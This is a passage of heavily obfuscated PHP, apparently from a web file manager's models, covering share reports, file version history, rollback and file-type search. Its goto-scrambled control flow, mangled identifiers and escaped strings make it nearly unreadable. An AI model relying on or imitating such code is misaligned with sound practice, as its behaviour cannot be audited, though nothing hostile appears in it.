Model($B‹°ó–²è [559])->where($B¬Šæ¨ÅõÈ)->delete(); goto e¦‡ÕœßÕ; CÃ—¢õ—ğ: $B‹°ó–²è  =& $_SERVER[Â€Á›¨õ]; $B¬Šæ¨ÅõÈ = array($B‹°ó–²è [404] => array($B‹°ó–²è [405], $EÛÇÉ•šÌª)); $BÀÙã¾òæº = $this->field($B‹°ó–²è [462])->where($B¬Šæ¨ÅõÈ)->select(); goto fé†‡íÁà¨; fé†‡íÁà¨: $BÀÙã¾òæº = array_to_keyvalue($BÀÙã¾òæº, $B‹°ó–²è [33], $B‹°ó–²è [462]); if (!$BÀÙã¾òæº) { return; } $B¬Šæ¨ÅõÈ = array($B‹°ó–²è [461] => array($B‹°ó–²è [405], $BÀÙã¾òæº)); goto BÁ®§Áò¨; e¦‡ÕœßÕ: } public function listAll($D÷°›¾¥ ˜) { goto aİˆ †ç»ø; EÆÉÜòÑï: if ($D÷°›¾¥ ˜[$cÓ­øÉ¤èš[715]]) { $EßÑ®åÛƒ = $D÷°›¾¥ ˜[$cÓ­øÉ¤èš[470]] ? $D÷°›¾¥ ˜[$cÓ­øÉ¤èš[470]] : strtotime(date($cÓ­øÉ¤èš[1821])); $D«×£‰ößÄ[$cÓ­øÉ¤èš[192]] = array($cÓ­øÉ¤èš[329], array($D÷°›¾¥ ˜[$cÓ­øÉ¤èš[715]], $EßÑ®åÛƒ)); } if ($D÷°›¾¥ ˜[$cÓ­øÉ¤èš[29]]) { $D«×£‰ößÄ[$D÷°›¾¥ ˜[$cÓ­øÉ¤èš[29]]] = 1; } else { $D«×£‰ößÄ[] = array($cÓ­øÉ¤èš[467] => array($cÓ­øÉ¤èš[944], 0), $cÓ­øÉ¤èš[469] => array($cÓ­øÉ¤èš[944], 0), $cÓ­øÉ¤èš[1798] => $cÓ­øÉ¤èš[1752]); } if ($D÷°›¾¥ ˜[$cÓ­øÉ¤èš[1748]]) { $D«×£‰ößÄ[] = array($cÓ­øÉ¤èš[464] => $D÷°›¾¥ ˜[$cÓ­øÉ¤èš[1748]], $cÓ­øÉ¤èš[1406] => array($cÓ­øÉ¤èš[378], "\45{$D÷°›¾¥ ˜[$cÓ­øÉ¤èš[1748]]}\45"), $cÓ­øÉ¤èš[1798] => $cÓ­øÉ¤èš[1752]); } goto FÄ‰–ÀÃÊø; Bì½©…ÀÄ: return $D†¼ÓÏ¤£¥; goto BÌ«˜‹·ˆ; FÄ‰–ÀÃÊø: $D†¼ÓÏ¤£¥ = $this->_makeOrder()->where($D«×£‰ößÄ)->selectPage(20); if (empty($D†¼ÓÏ¤£¥[$cÓ­øÉ¤èš[365]])) { return array(); } $this->_listDataApply($D†¼ÓÏ¤£¥[$cÓ­øÉ¤èš[365]]); goto Bì½©…ÀÄ; aİˆ †ç»ø: $cÓ­øÉ¤èš =& $_SERVER[Â€Á›¨õ]; $D«×£‰ößÄ = array(); if ($D÷°›¾¥ ˜[$cÓ­øÉ¤èš[1501]]) { $D«×£‰ößÄ[$cÓ­øÉ¤èš[1501]] = $D÷°›¾¥ ˜[$cÓ­øÉ¤èš[1501]]; } goto EÆÉÜòÑï; BÌ«˜‹·ˆ: } public function listDataApply($cç¨¦»ïï¼) { $this->_listDataApply($cç¨¦»ïï¼); return $cç¨¦»ïï¼; } private function _listDataApply(&$C†¿–Àì) { goto a· èóÑ‘®; F¶“®ŠÂÅ¶: $F„Ú¿ãóÉ¤ = array_to_keyvalue($C†¿–Àì, $a³ÈéË¾²[33], $a³ÈéË¾²[390]); $bÎÌİğ¨Ã„ = Model($a³ÈéË¾²[767])->sourceListInfo($F„Ú¿ãóÉ¤, !0); foreach ($C†¿–Àì as &$aÃ£çÏ¼ó‚) { $C—Ëù­Ô¼ = $aÃ£çÏ¼ó‚[$a³ÈéË¾²[1501]]; $aÃ£çÏ¼ó‚[$a³ÈéË¾²[1822]] = $fÃ¾‡Âáï[$C—Ëù­Ô¼] ? $fÃ¾‡Âáï[$C—Ëù­Ô¼] : !1; $eÍ†¢øàÜ³ = $aÃ£çÏ¼ó‚[$a³ÈéË¾²[390]]; $aÃ£çÏ¼ó‚[$a³ÈéË¾²[84]] = $bÎÌİğ¨Ã„[$eÍ†¢øàÜ³] ? $bÎÌİğ¨Ã„[$eÍ†¢øàÜ³] : !1; } goto FºÒÖ÷¡¹‚; a· èóÑ‘®: $a³ÈéË¾² =& $_SERVER[Â€Á›¨õ]; $CÎ«İ‰× = array_to_keyvalue($C†¿–Àì, $a³ÈéË¾²[33], $a³ÈéË¾²[1501]); $fÃ¾‡Âáï = Model($a³ÈéË¾²[501])->userListInfo(array_unique($CÎ«İ‰×)); goto F¶“®ŠÂÅ¶; FºÒÖ÷¡¹‚: unset($aÃ£çÏ¼ó‚); goto bïÕË¯Û¥¥; bïÕË¯Û¥¥: } private function _makeOrder($EŠ‘‰¿âˆ = '') { goto A²ïíÄŠ©¸; A²ïíÄŠ©¸: $E©©¥…ˆùã =& $_SERVER[Â€Á›¨õ]; $FÙ¼ŞÙ¬§ = array($E©©¥…ˆùã[192], $E©©¥…ˆùã[470], $E©©¥…ˆùã[1811], $E©©¥…ˆùã[1812]); $F·èá®ùì¢ = array($E©©¥…ˆùã[422] => $E©©¥…ˆùã[423], $E©©¥…ˆùã[424] => $E©©¥…ˆùã[425]); goto F‹˜ööÈÖ™; F§‰¤ÙŒ¨“: $EŠ‘‰¿âˆ = $EŠ‘‰¿âˆ . "{$cßæíÁØ}\40{$aƒÖÇ‹¦»}"; return $this->order($EŠ‘‰¿âˆ); goto dÄœŞœ°¥é; F‹˜ööÈÖ™: $cßæíÁØ = Input::get($E©©¥…ˆùã[429], $E©©¥…ˆùã[7], $E©©¥…ˆùã[410], $FÙ¼ŞÙ¬§); $aƒÖÇ‹¦» = Input::get($E©©¥…ˆùã[430], $E©©¥…ˆùã[7], $E©©¥…ˆùã[1823], array($E©©¥…ˆùã[1747], $E©©¥…ˆùã[424])); $aƒÖÇ‹¦» = $F·èá®ùì¢[$aƒÖÇ‹¦»]; goto F§‰¤ÙŒ¨“; dÄœŞœ°¥é: } public function reportAdd($Cì½ó¡ŠÃÄ) { $a‚Ã–­Õ‚ê =& $_SERVER[Â€Á›¨õ]; $e†ÃˆÈƒ²î = array($a‚Ã–­Õ‚ê[462] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[462]], $a‚Ã–­Õ‚ê[1501] => USER_ID); if (Model($a‚Ã–­Õ‚ê[1819])->where($e†ÃˆÈƒ²î)->find()) { return !1; } $Dªà“„Ú”µ = array($a‚Ã–­Õ‚ê[462] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[462]], $a‚Ã–­Õ‚ê[1406] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[1406]], $a‚Ã–­Õ‚ê[390] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[390]], $a‚Ã–­Õ‚ê[441] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[441]], $a‚Ã–­Õ‚ê[1501] => USER_ID, $a‚Ã–­Õ‚ê[29] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[29]], $a‚Ã–­Õ‚ê[425] => $Cì½ó¡ŠÃÄ[$a‚Ã–­Õ‚ê[425]]); return Model($a‚Ã–­Õ‚ê[1819])->add($Dªà“„Ú”µ); } public function reportList($C²ãÁÓºê) { goto E¡ê Š—œÄ; Aã±ªŒ’•: if (empty($e»ŒÛê‘´¿[$fôÓÈ—’Ëó[365]])) { return array(); } $this->_listDataApply($e»ŒÛê‘´¿[$fôÓÈ—’Ëó[365]]); return $e»ŒÛê‘´¿; goto aÎ…“±¾‹; FšƒÂœ¹¼‡: $fï™ˆ¸¥÷ñ = array($fôÓÈ—’Ëó[422] => $fôÓÈ—’Ëó[423], $fôÓÈ—’Ëó[424] => $fôÓÈ—’Ëó[425]); $D®›¿Öœå¾ = $fôÓÈ—’Ëó[1828] . $fï™ˆ¸¥÷ñ[$c§Ìù››ô]; $e»ŒÛê‘´¿ = Model($fôÓÈ—’Ëó[1819])->where($b®Ø˜É¨·‹)->order($D®›¿Öœå¾)->selectPage(20); goto Aã±ªŒ’•; E¡ê Š—œÄ: $fôÓÈ—’Ëó =& $_SERVER[Â€Á›¨õ]; $b®Ø˜É¨·‹ = array(); if ($C²ãÁÓºê[$fôÓÈ—’Ëó[715]]) { $eâŒ»™ê¥ = $C²ãÁÓºê[$fôÓÈ—’Ëó[470]] ? $C²ãÁÓºê[$fôÓÈ—’Ëó[470]] : strtotime(date($fôÓÈ—’Ëó[1821])); $b®Ø˜É¨·‹[$fôÓÈ—’Ëó[192]] = array($fôÓÈ—’Ëó[329], array($C²ãÁÓºê[$fôÓÈ—’Ëó[715]], $eâŒ»™ê¥)); } goto fšÄ±éÌ›; fšÄ±éÌ›: if (isset($C²ãÁÓºê[$fôÓÈ—’Ëó[29]]) && in_array($C²ãÁÓºê[$fôÓÈ—’Ëó[29]], array($fôÓÈ—’Ëó[86], $fôÓÈ—’Ëó[1824], $fôÓÈ—’Ëó[1825], $fôÓÈ—’Ëó[1826], $fôÓÈ—’Ëó[1827]))) { $b®Ø˜É¨·‹[$fôÓÈ—’Ëó[29]] = $C²ãÁÓºê[$fôÓÈ—’Ëó[29]]; } if (isset($C²ãÁÓºê[$fôÓÈ—’Ëó[702]]) && in_array($C²ãÁÓºê[$fôÓÈ—’Ëó[702]], array($fôÓÈ—’Ëó[491], $fôÓÈ—’Ëó[86], $fôÓÈ—’Ëó[1824], $fôÓÈ—’Ëó[1825]))) { $b®Ø˜É¨·‹[$fôÓÈ—’Ëó[702]] = $C²ãÁÓºê[$fôÓÈ—’Ëó[702]]; } $c§Ìù››ô = Input::get($fôÓÈ—’Ëó[430], $fôÓÈ—’Ëó[7], $fôÓÈ—’Ëó[1823], array($fôÓÈ—’Ëó[1747], $fôÓÈ—’Ëó[424])); goto FšƒÂœ¹¼‡; aÎ…“±¾‹: } public function reportStatus($Cù¦ƒ´¦©) { goto FÒ˜‹ÈÈİ„; D”Ó¦–Åò: $F¬®ÓÆğà­ = Model($E¢ëè–Ç¡Ï[1819])->where($dŠÇÀ´‡­°)->save($D¿ ¿°ãï›); if ($Cù¦ƒ´¦©[$E¢ëè–Ç¡Ï[702]] == $E¢ëè–Ç¡Ï[1824]) { if ($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[441]] != $E¢ëè–Ç¡Ï[491] && $this->shareFileMeta($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[441]])) { $this->shareFileMeta($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[441]], 0); } $this->remove($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[462]]); return !0; } if ($F¬®ÓÆğà­ && $Cù¦ƒ´¦©[$E¢ëè–Ç¡Ï[702]] == $E¢ëè–Ç¡Ï[1825]) { $eø„¯ÃÊ—À = $D¿ ¿°ãï›[$E¢ëè–Ç¡Ï[702]] == $E¢ëè–Ç¡Ï[1825] ? 1 : 0; $this->shareFileMeta($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[441]], $eø„¯ÃÊ—À); $this->removeByFile($bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[441]]); } goto A³ø£À®‚; A³ø£À®‚: return $F¬®ÓÆğà­; goto b×éìÇ£; FÒ˜‹ÈÈİ„: $E¢ëè–Ç¡Ï =& $_SERVER[Â€Á›¨õ]; $dŠÇÀ´‡­° = array($E¢ëè–Ç¡Ï[388] => $Cù¦ƒ´¦©[$E¢ëè–Ç¡Ï[388]]); $bÊéŒÁğ¹ = Model($E¢ëè–Ç¡Ï[1819])->where($dŠÇÀ´‡­°)->field($E¢ëè–Ç¡Ï[1829])->find(); goto dØ”©Ó™ºø; dØ”©Ó™ºø: if (!$bÊéŒÁğ¹) { return !1; } $D¿ ¿°ãï› = array($E¢ëè–Ç¡Ï[702] => $Cù¦ƒ´¦©[$E¢ëè–Ç¡Ï[702]]); if ($Cù¦ƒ´¦©[$E¢ëè–Ç¡Ï[702]] == $E¢ëè–Ç¡Ï[1825] && $bÊéŒÁğ¹[$E¢ëè–Ç¡Ï[702]] == $E¢ëè–Ç¡Ï[1825]) { $D¿ ¿°ãï›[$E¢ëè–Ç¡Ï[702]] = 0; } goto D”Ó¦–Åò; b×éìÇ£: } private function removeByFile($D¾ù¹ƒ¿ê) { goto DŞ°Ö¨‘‘İ; F÷®®ˆ„óŸ: $a¥•ØËƒÑ = array($E§è¸†ß®­[390] => array($E§è¸†ß®­[7], $e’™·£–È), $E§è¸†ß®­[467] => 1); $Cñ² òÑ« = Model($E§è¸†ß®­[1641])->where($a¥•ØËƒÑ)->field($E§è¸†ß®­[462])->select(); if (empty($Cñ² òÑ«)) { return; } goto f‚±ˆ; f‚±ˆ: $e¸ùéï©š = array_to_keyvalue($Cñ² òÑ«, $E§è¸†ß®­[33], $E§è¸†ß®­[462]); $this->remove($e¸ùéï©š); goto A½Àµäß¢ø; DŞ°Ö¨‘‘İ: $E§è¸†ß®­ =& $_SERVER[Â€Á›¨õ]; $Cñ² òÑ« = Model($E§è¸†ß®­[767])->where(array($E§è¸†ß®­[441] => $D¾ù¹ƒ¿ê))->field($E§è¸†ß®­[390])->select(); $e’™·£–È = array_to_keyvalue($Cñ² òÑ«, $E§è¸†ß®­[33], $E§è¸†ß®­[390]); goto F÷®®ˆ„óŸ; A½Àµäß¢ø: } private function shareFileMeta($Fï‡¼ã¬õ˜, $d˜é¾¿…¬— = null) { $Bâ‚‰½ÄóÚ =& $_SERVER[Â€Á›¨õ]; $D´ë¦Òä² = array($Bâ‚‰½ÄóÚ[441] => $Fï‡¼ã¬õ˜, $Bâ‚‰½ÄóÚ[92] => $Bâ‚‰½ÄóÚ[1830]); if (is_null($d˜é¾¿…¬—)) { return Model($Bâ‚‰½ÄóÚ[1831])->where($D´ë¦Òä²)->find(); } $D´ë¦Òä²[$Bâ‚‰½ÄóÚ[370]] = $d˜é¾¿…¬—; Model($Bâ‚‰½ÄóÚ[1831])->add($D´ë¦Òä², array(), !0); } } goto f„˜º®Ç; D‡÷É©ª: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\162\143\145\137\150\x69\x73\164\x6f\162\x79"; public function historyCount($fÔÆÂğ™°ğ) { goto D¿ºñ‚÷Ö; FÛ£ÆİæäÌ: return array_to_keyvalue($D½İàƒ¨», $báæÁÖ¨[390], $báæÁÖ¨[474]); goto cë°‚îÛ×; Bˆ¹×È›æÍ: $C‰Ó êÌ„’ = array($báæÁÖ¨[390], $báæÁÖ¨[1696] => $báæÁÖ¨[474]); $d…¢ÇàƒÒê = array($báæÁÖ¨[390] => array($báæÁÖ¨[7], $fÔÆÂğ™°ğ)); $D½İàƒ¨» = $this->field($C‰Ó êÌ„’)->where($d…¢ÇàƒÒê)->group($báæÁÖ¨[390])->select(); goto FÛ£ÆİæäÌ; D¿ºñ‚÷Ö: $báæÁÖ¨ =& $_SERVER[Â€Á›¨õ]; if (!$fÔÆÂğ™°ğ) { return array(); } if (is_string($fÔÆÂğ™°ğ) || is_int($fÔÆÂğ™°ğ)) { $fÔÆÂğ™°ğ = array($fÔÆÂğ™°ğ); } goto Bˆ¹×È›æÍ; cë°‚îÛ×: } public function addHistory($bàÆ•ğ‹ Û, $CŸ¤µœ‚† = '') { $FÆ²¸ˆ‰ÛÂ =& $_SERVER[Â€Á›¨õ]; $Aã£ª¾Í´º = array($FÆ²¸ˆ‰ÛÂ[404] => $bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[390]], $FÆ²¸ˆ‰ÛÂ[1493] => isset($bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[428]]) ? $bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[428]] : $bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[426]], $FÆ²¸ˆ‰ÛÂ[442] => $bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[441]], $FÆ²¸ˆ‰ÛÂ[543] => $bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[77]], $FÆ²¸ˆ‰ÛÂ[1893] => $CŸ¤µœ‚†); $E¡ƒêšÌ¬¨ = $GLOBALS[$FÆ²¸ˆ‰ÛÂ[6]][$FÆ²¸ˆ‰ÛÂ[87]][$FÆ²¸ˆ‰ÛÂ[1077]]; if ($E¡ƒêšÌ¬¨ > 1) { $this->historyAutoClear($Aã£ª¾Í´º[$FÆ²¸ˆ‰ÛÂ[390]]); $this->add($Aã£ª¾Í´º); } Hook::trigger($FÆ²¸ˆ‰ÛÂ[1894], $Aã£ª¾Í´º); Model($FÆ²¸ˆ‰ÛÂ[1895])->eventFileEdit($bàÆ•ğ‹ Û[$FÆ²¸ˆ‰ÛÂ[390]]); } private function historyAutoClear($A³ÑÎ˜å˜) { goto dóÀ”ËŞ‡¬; BŒˆ§õßØÄ: $aíªÉ³¥×Ş = $c‚¸ÊÒöÛ® == $DĞ§ë³„£[1100] ? 5 : $câ•ˆŠ‹¬; if ($câ•ˆŠ‹¬ <= 1) { $aíªÉ³¥×Ş = 1; } if ($aíªÉ³¥×Ş >= 500) { return; } goto bËî¶¾Å; eã¡ÅÌ½ô¸: $Cë•åŠô†“ = array_slice($Cë•åŠô†“, $aíªÉ³¥×Ş); if (!$C†‘Ÿ¦ìá || !$Cë•åŠô†“) { return; } $fêƒËóù²… = array($DĞ§ë³„£[406] => array($DĞ§ë³„£[7], $C†‘Ÿ¦ìá)); goto fùö¹ç´²ï; dóÀ”ËŞ‡¬: $DĞ§ë³„£ =& $_SERVER[Â€Á›¨õ]; $c‚¸ÊÒöÛ® = Model($DĞ§ë³„£[1098])->get($DĞ§ë³„£[1099]); $câ•ˆŠ‹¬ = $GLOBALS[$DĞ§ë³„£[6]][$DĞ§ë³„£[87]][$DĞ§ë³„£[1077]]; goto BŒˆ§õßØÄ; bËî¶¾Å: $fêƒËóù²… = array($DĞ§ë³„£[404] => $A³ÑÎ˜å˜); $EÊ•“®° = $this->field($DĞ§ë³„£[1896])->where($fêƒËóù²…)->order($DĞ§ë³„£[1890])->select(); if (!$EÊ•“®° || $aíªÉ³¥×Ş >= count($EÊ•“®°)) { return; } goto EíÈÇù–¬; fùö¹ç´²ï: $this->where($fêƒËóù²…)->delete(); Model($DĞ§ë³„£[444])->remove($Cë•åŠô†“); goto CÄÖÚÀ”÷; EíÈÇù–¬: $C†‘Ÿ¦ìá = array_to_keyvalue($EÊ•“®°, $DĞ§ë³„£[33], $DĞ§ë³„£[388]); $C†‘Ÿ¦ìá = array_slice($C†‘Ÿ¦ìá, $aíªÉ³¥×Ş); $Cë•åŠô†“ = array_to_keyvalue($EÊ•“®°, $DĞ§ë³„£[33], $DĞ§ë³„£[441]); goto eã¡ÅÌ½ô¸; CÄÖÚÀ”÷: } public function listData($BîªËÕÜóë) { goto A’Èã¯àõ¯; dØÖÉÀÅ ¿: $dÏ‹—²íÓ = $this->field($f¥µŞÜùœá)->where($aÑ‹ÏÅ·àÇ)->order($B¿Í´Ğ²¢[1890])->selectPage(); $this->_listAppendUser($dÏ‹—²íÓ[$B¿Í´Ğ²¢[365]]); $f‰‹¤ì¤µ = Model($B¿Í´Ğ²¢[1098])->get($B¿Í´Ğ²¢[1099]); goto e„ß²â…Ò; e„ß²â…Ò: $c‘„è·¹ÇÀ = 5; if ($f‰‹¤ì¤µ == $B¿Í´Ğ²¢[1100]) { $dÏ‹—²íÓ[$B¿Í´Ğ²¢[365]] = array_slice($dÏ‹—²íÓ[$B¿Í´Ğ²¢[365]], 0, $c‘„è·¹ÇÀ); $dÏ‹—²íÓ[$B¿Í´Ğ²¢[362]] = array($B¿Í´Ğ²¢[1898] => 1, $B¿Í´Ğ²¢[1899] => 20, $B¿Í´Ğ²¢[1900] => 1, $B¿Í´Ğ²¢[1901] => count($dÏ‹—²íÓ[$B¿Í´Ğ²¢[365]])); } return $dÏ‹—²íÓ; goto Aê¥Äéë‡ø; A’Èã¯àõ¯: $B¿Í´Ğ²¢ =& $_SERVER[Â€Á›¨õ]; $aÑ‹ÏÅ·àÇ = array($B¿Í´Ğ²¢[404] => $BîªËÕÜóë); $f¥µŞÜùœá = $B¿Í´Ğ²¢[1897]; goto dØÖÉÀÅ ¿; Aê¥Äéë‡ø: } protected function _listAppendUser(&$f±ª†­õ¨) { $Eƒ‚¬ä‰Ã =& $_SERVER[Â€Á›¨õ]; $c£ïçÒ½±Ã = array_to_keyvalue($f±ª†­õ¨, $Eƒ‚¬ä‰Ã[33], $Eƒ‚¬ä‰Ã[1501]); $eªµ˜—…‰¹ = Model($Eƒ‚¬ä‰Ã[501])->userListInfo($c£ïçÒ½±Ã); foreach ($f±ª†­õ¨ as &$cÂæ»ğù) { $f™º¦“£Ë’ = $cÂæ»ğù[$Eƒ‚¬ä‰Ã[1501]]; $cÂæ»ğù[$Eƒ‚¬ä‰Ã[426]] = $eªµ˜—…‰¹[$f™º¦“£Ë’] ? $eªµ˜—…‰¹[$f™º¦“£Ë’] : !1; } unset($cÂæ»ğù); } public function fileInfo($e‰Ëô¬ÉÙœ) { $føìòëÌô¨ =& $_SERVER[Â€Á›¨õ]; $cîŠŸùâÙ· = $this->tablePrefix; $bÏ‰¤×‰„Á = "{$cîŠŸùâÙ·}\151\157\x5f\x66\x69\154\145\40\x66\151\154\x65\163\x20\x6f\x6e\40\146\x69\154\x65\163\x2e\x66\151\x6c\x65\111\x44\40\75\x20\x68\151\x73\x74\x6f\162\171\x2e\x66\x69\154\145\111\x44"; return $this->alias($føìòëÌô¨[1902])->where(array($føìòëÌô¨[406] => $e‰Ëô¬ÉÙœ))->join($bÏ‰¤×‰„Á, $føìòëÌô¨[1903])->find(); } public function removeItem($A®¨§æˆÃè) { $eğ«ƒ¬çÃ =& $_SERVER[Â€Á›¨õ]; $f¸¹èµ°Œ× = array($eğ«ƒ¬çÃ[406] => $A®¨§æˆÃè); $c„¹Í²Ü = $this->where($f¸¹èµ°Œ×)->find(); if ($c„¹Í²Ü) { $B êÙÀ›õ = $this->where($f¸¹èµ°Œ×)->delete(); Model($eğ«ƒ¬çÃ[444])->remove($c„¹Í²Ü[$eğ«ƒ¬çÃ[441]]); return $B êÙÀ›õ; } return !1; } public function removeBySource($aÅ‚™®¯¸¡) { goto dŠÊ£ÑÂÛ; dŠÊ£ÑÂÛ: $E¾Ìƒ¯Ñ¶× =& $_SERVER[Â€Á›¨õ]; if (!$aÅ‚™®¯¸¡) { return !1; } if (!is_array($aÅ‚™®¯¸¡)) { $aÅ‚™®¯¸¡ = array($aÅ‚™®¯¸¡); } goto fİœ¦ù«ŞÇ; Eœî‚‚‚·è: return !0; goto eÓèÅ¿¹ä…; fİœ¦ù«ŞÇ: $CÌù¬Ö§Ğö = array($E¾Ìƒ¯Ñ¶×[404] => array($E¾Ìƒ¯Ñ¶×[7], $aÅ‚™®¯¸¡)); $Eï¾¾Â—æŸ = $this->field($E¾Ìƒ¯Ñ¶×[442])->where($CÌù¬Ö§Ğö)->select(); if ($Eï¾¾Â—æŸ) { $this->where($CÌù¬Ö§Ğö)->delete(); $fçÍôõ™™Â = array_to_keyvalue($Eï¾¾Â—æŸ, $E¾Ìƒ¯Ñ¶×[33], $E¾Ìƒ¯Ñ¶×[441]); Model($E¾Ìƒ¯Ñ¶×[444])->remove($fçÍôõ™™Â); } goto Eœî‚‚‚·è; eÓèÅ¿¹ä…: } public function setDetail($d¥½„ô”†¢, $c« ×µÎ³â) { $Aèµˆé« =& $_SERVER[Â€Á›¨õ]; return $this->where(array($Aèµˆé«[406] => $d¥½„ô”†¢))->save(array($Aèµˆé«[1893] => $c« ×µÎ³â)); } public function rollbackToItem($B³îš¼¬²†, $a÷—©ò¹êÃ) { goto eœ•ŒÍ‹î; eœ•ŒÍ‹î: $bøôøß¢£¡ =& $_SERVER[Â€Á›¨õ]; $C‰Š¿ó‚¦ê = Model($bøôøß¢£¡[767])->sourceInfo($B³îš¼¬²†); $this->addHistory($C‰Š¿ó‚¦ê, LNG($bøôøß¢£¡[1904])); goto b©ö’—ìê‹; b©ö’—ìê‹: $B¢ÁäŠ•Œ = $this->find($a÷—©ò¹êÃ); $cñÇ†Ö–Û = array($bøôøß¢£¡[441] => $B¢ÁäŠ•Œ[$bøôøß¢£¡[441]], $bøôøß¢£¡[77] => $B¢ÁäŠ•Œ[$bøôøß¢£¡[77]], $bøôøß¢£¡[83] => time(), $bøôøß¢£¡[428] => USER_ID); Model($bøôøß¢£¡[767])->where(array($bøôøß¢£¡[390] => $B³îš¼¬²†))->save($cñÇ†Ö–Û); goto b²Ëá¢‚Ì­; b²Ëá¢‚Ì­: return $this->where(array($bøôøß¢£¡[406] => $a÷—©ò¹êÃ))->delete(); goto bË‚¢ˆ¿§â; bË‚¢ˆ¿§â: } public function clearSame($d—„ïõÍ¶Î) { goto FŞ¦Şšˆ; A…õÇ¹ÛÅ: if (!$bÏ´ïÍß Ä) { return; } $this->where(array($a¼æ™Ù¤†Ó[388] => array($a¼æ™Ù¤†Ó[7], $bÏ´ïÍß Ä)))->delete(); Model($a¼æ™Ù¤†Ó[444])->remove($c¥Ôáä»Ï); goto C‰„ÊÛÑ¨“; FŞ¦Şšˆ: $a¼æ™Ù¤†Ó =& $_SERVER[Â€Á›¨õ]; $aÆ¢Ğ×¾ = $this->listData($d—„ïõÍ¶Î); $D¾êïµ˜Í = array_to_keyvalue_group($aÆ¢Ğ×¾, $a¼æ™Ù¤†Ó[441]); goto D˜óˆèÏå†; D˜óˆèÏå†: $c¥Ôáä»Ï = array(); $bÏ´ïÍß Ä = array(); foreach ($D¾êïµ˜Í as $aÈªÇ…âç) { if (!$aÈªÇ…âç || count($aÈªÇ…âç) <= 1) { continue; } foreach ($aÈªÇ…âç as $B˜ˆ‘Œ½á) { $c¥Ôáä»Ï[] = $B˜ˆ‘Œ½á[$a¼æ™Ù¤†Ó[441]]; $bÏ´ïÍß Ä[] = $B˜ˆ‘Œ½á[$a¼æ™Ù¤†Ó[388]]; } } goto A…õÇ¹ÛÅ; C‰„ÊÛÑ¨“: } public function userSpace() { $D–„ø´­³İ =& $_SERVER[Â€Á›¨õ]; $E•ŞˆŠ’Ç° = $this->tablePrefix; $EïµØÎ‡ù = array($D–„ø´­³İ[1493] => USER_ID); $cÁ½¬è˜© = "{$E•ŞˆŠ’Ç°}\151\x6f\x5f\x66\151\x6c\x65\40\x66\x69\154\145\x73\40\x6f\156\40\146\x69\x6c\145\163\x2e\146\x69\x6c\x65\x49\x44\x20\75\40\150\151\163\x74\157\x72\x79\x2e\146\x69\x6c\x65\111\104"; return $this->alias($D–„ø´­³İ[1902])->where($EïµØÎ‡ù)->join($cÁ½¬è˜©, $D–„ø´­³İ[1903])->sum($D–„ø´­³İ[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($C®‰„ŠÎ¿) { goto c†˜Ò·Œ¶; c†˜Ò·Œ¶: $dïÍó”œ™Õ =& $_SERVER[Â€Á›¨õ]; $föùß–¼ö = KodIO::fileTypeList(); $eÌŸè¡š§÷ = $föùß–¼ö[$C®‰„ŠÎ¿]; goto f†‰å‘È‡; f†‰å‘È‡: if (!$eÌŸè¡š§÷) { return array(); } $D«Óº¾†¬„ = $eÌŸè¡š§÷[$dïÍó”œ™Õ[167]]; $B‚ùÂ± = $dïÍó”œ™Õ[7]; goto Dà´™Õ†‹; Dà´™Õ†‹: if (!$eÌŸè¡š§÷[$dïÍó”œ™Õ[167]]) { $BºÒÕìÀ˜ğ = array_to_keyvalue($föùß–¼ö, $dïÍó”œ™Õ[33], $dïÍó”œ™Õ[167]); $D«Óº¾†¬„ = implode($dïÍó”œ™Õ[47], $BºÒÕìÀ˜ğ); $B‚ùÂ± = $dïÍó”œ™Õ[1905]; } $Cò‡†šßÊ‹ = explode($dïÍó”œ™Õ[47], trim($D«Óº¾†¬„, $dïÍó”œ™Õ[47])); return array($B‚ùÂ±, $Cò‡†šßÊ‹); goto E¸˜í¯Â——; E¸˜í¯Â——: } public function listPathType($F»º†«ôºè) { $Fë¬«ì÷ô =& $_SERVER[Â€Á›¨õ]; $e±…¬ˆ = $this->fileTypeWhere($F»º†«ôºè); if (!$e±…¬ˆ) { return array(); } $D„©è¼ªŞ† = array($Fë¬«ì÷ô[544] => SourceModel::TYPE_USER, $Fë¬«ì÷ô[545] => USER_ID, $Fë¬«ì÷ô[541] => 0, $Fë¬«ì÷ô[542] => $e±…¬ˆ); return $this->listSource($D„©è¼ªŞ†); } public function listSearch($fè±ñÂ’Š­, $e•ñÙ“¤óØ = 300) { goto c¶²‡¤ç‹; e÷ğºÁƒÃğ: $dñº²æÓ®È = $this->distinct(!0)->field($C»¨ƒåìß)->where($Dõµß¡‹¹í)->selectPage($e•ñÙ“¤óØ); $this->_listSearchDesc($dñº²æÓ®È, $fè±ñÂ’Š­, $a‰ù¤˜ğƒ); $this->_listSearchTag($dñº²æÓ®È, $fè±ñÂ’Š­, $a‰ù¤˜ğƒ); goto F¶¢ºà±â»; F¶¢ºà±â»: $this->_listSearchGroupTag($dñº²æÓ®È, $fè±ñÂ’Š­, $a‰ù¤˜ğƒ); $this->_listDataApply($dñº²æÓ®È[$a¥·¥øº£³[365]]); $this->_listMake($dñº²æÓ®È); goto BŒÆçù™·‡; c¶²‡¤ç‹: $a¥·¥øº£³ =& $_SERVER[Â€Á›¨õ]; if (isset($fè±ñÂ’Š­[$a¥·¥øº£³[1748]]) && $fè±ñÂ’Š­[$a¥·¥øº£³[1748]]) { $fè±ñÂ’Š­[$a¥·¥øº£³[1748]] = str_replace($a¥·¥øº£³[379], $a¥·¥øº£³[1906], 